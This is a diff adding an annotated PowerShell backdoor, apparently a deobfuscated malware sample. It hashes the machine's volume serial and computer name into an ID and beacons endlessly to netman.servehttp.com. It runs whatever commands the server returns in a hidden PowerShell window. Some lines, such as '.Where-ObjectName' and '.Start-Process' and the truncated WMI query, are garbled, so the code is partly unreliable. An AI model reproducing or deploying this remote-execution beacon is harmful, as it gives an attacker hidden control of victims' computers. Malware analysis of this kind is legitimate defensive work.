@@ -1,0 +1,109 @@
+# This script appears to be a piece of malicious PowerShell code designed to run indefinitely on a Windows system.
+
+do {
+    # Set the URL to a potentially malicious site
+    $url = "http://netman.servehttp.com";
+    
+    # Function to check if a string is Base64 encoded
+    function f0($str) {
+        $result = $false;
+        try {
+            $val = [System.Convert]::FromBase64String($str);
+            if ($val.Length -gt 0) {
+                $result = $true;
+            }
+        }
+        catch {}
+        return $result;
+    }
+    
+    # Main function containing the malicious logic
+    function f1() {
+        # Generate a random sleep time between 1 to 2 seconds
+        $sleepVal = (Get-Random -Minimum 1 -Maximum 2);
+        Start-Sleep -Seconds $sleepVal;
+        
+        # Construct WMI query to get system information
+        $sp = [System.Text.Encoding]::UTF8.GetString([byte[]]@(0x27));
+        $query = "select * from win32_logicaldisk where DeviceID=" + $sp;
+        $serialNumber = (Get-WmiObject -Query($query)).VolumeSerialNumber;
+        $computerName = $env:computername;
+        
+        # Compute unique computer ID using SHA256 and MD5 hash functions
+        $hasherSHA256 = New-Object System.Security.Cryptography.SHA256CryptoServiceProvider;
+        $hasherMD5 = New-Object System.Security.Cryptography.MD5CryptoServiceProvider;
+        $methodComputeHash = ($hasherSHA256.GetType().GetMethods() | .Where-ObjectName -eq Computehash)[1];
+        $computerIdBytes = [System.Text.Encoding]::UTF8.GetBytes($computerName + '_' + $serialNumber);
+        $shaBytes = $methodComputeHash.Invoke($hasherSHA256, @($computerIdBytes));
+        $md5Bytes = $methodComputeHash.Invoke($hasherMD5, @($shaBytes));
+        $computerIdBytesMerge = @();
+        for ($i = 0; $i -lt $shaBytes.Length; $i++) {
+            $computerIdBytesMerge += $shaBytes[$i];
+        }
+        for ($i = 0; $i -lt $md5Bytes.Length; $i++) {
+            $computerIdBytesMerge += $md5Bytes[$i];
+        }
+        $computerId = [System.Convert]::ToBase64String($computerIdBytesMerge);
+        
+        # Set user agent string
+        $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0';
+        
+        # Main loop to continuously execute malicious actions
+        while ($true) {
+            do {
+                try {
+                    # Create a web client object
+                    $webClient = New-Object System.Net.WebClient;
+                    $webClient.Headers['User-Agent'] = $userAgent;
+                    $webClient.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.5');
+                    $webClient.Headers.Add('Accept-Language', 'en-US;q=0.5,en;q=0.3');
+                    $webClient.Headers.Add('Upgrade-Insecure-Requests', '1');
+                    $webClient.Headers.Add('X-Cookie', $computerId);
+                    
+                    # Invoke the DownloadString method to fetch data from the URL
+                    $meth = ($webClient.GetType().GetMethods() | .Where-ObjectName -eq DownloadString)[0];
+                    $resp = $meth.Invoke($webClient, @($url));
+                    
+                    # Dispose of the web client object
+                    $webClient.Dispose();
+                    $webClient = $null;
+                    
+                    # If response is empty or null, break the loop
+                    if ((!$resp) -or ($resp.Length -eq 0)) {
+                        break;
+                    }
+                    
+                    # Determine command type based on whether response is Base64 encoded
+                    $procName = "powershell";
+                    $cmdType = "-c";
+                    if (f0($resp)) {
+                        $cmdType = "-enC";
+                    }
+                    
+                    # Execute PowerShell command with the response as argument
+                    .Start-Process -WindowStyle Hidden -FilePath $procName -ArgumentList $cmdType, $resp;
+                }
+                catch {}
+                finally {
+                    # Dispose of the web client object
+                    if ($webClient) {
+                        try {
+                            $webClient.Dispose();
+                            $webClient = $null;
+                        }
+                        catch {}
+                    }
+                }
+            } while ($false);
+            
+            # Perform garbage collection and sleep for a random interval
+            [System.GC]::Collect();
+            $sleepVal = (Get-Random -Minimum 1000 -Maximum 2000);
+            Start-Sleep -Seconds $sleepVal;
+        }
+    }
+    
+    # Call the main function f1
+    $r = f1;
+    Write-Output('_m02tsfc: ' + $r);
+} while ($false);
